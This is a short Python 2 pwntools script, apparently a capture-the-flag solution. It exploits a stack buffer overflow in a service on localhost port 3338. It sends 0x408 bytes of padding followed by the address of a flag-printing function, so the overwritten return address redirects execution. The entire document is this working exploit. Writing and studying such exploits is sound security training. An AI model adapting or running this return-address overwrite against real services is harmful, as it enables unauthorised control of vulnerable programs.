#!/usr/bin/python2

from pwn import *


IP = "localhost"

FLAG_FUN = 0x0000000000400676

r = remote(IP, 3338)

r.recvline()
r.sendline("A"*0x408 + p64(FLAG_FUN))
print r.recvline()
print r.recvline()
